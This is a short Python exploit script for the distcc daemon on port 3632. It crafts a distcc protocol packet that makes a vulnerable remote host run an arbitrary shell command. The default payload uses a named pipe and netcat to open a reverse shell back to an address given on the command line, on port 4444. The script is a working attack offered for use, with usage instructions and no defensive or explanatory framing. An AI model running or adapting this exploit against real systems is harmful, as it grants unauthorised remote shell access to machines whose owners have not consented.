#!/bin/python3
# Script which coerces a remote distcc (distributed compolier) to run
# arbitrary bash commands. In this case it starts a connectback shell on
# remote vulnerable machine
import socket
from sys import argv

distccdPort 			= 3632

if len(argv)<2:
   print("Usage: {0} [Target IP Address] [Connect Back Address]\n".format(argv[0]) +
      "Default payload starts a connect back shell on port 4444")
   quit()

targetAddress = argv[1]

#This is the shell command to run on the remote machine. This payload creates a named pipe to connect a shell to netcat.
payload="mknod /tmp/pipe p && sh 0</tmp/pipe 2>&1 | nc {0} 4444 1>/tmp/pipe && rm /tmp/pipe".format(argv[2])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((targetAddress, distccdPort))
packet=b"DIST00000001"
packet+=b"ARGC00000003"
packet+=b"ARGV00000002sh"
packet+=b"ARGV00000002-c"
packet+=bytes("ARGV{0:08X}{1}".format(len(payload), payload), 'utf8')
packet+=b"DOTI00000008main(){}\r\n"
s.send(packet)
s.close
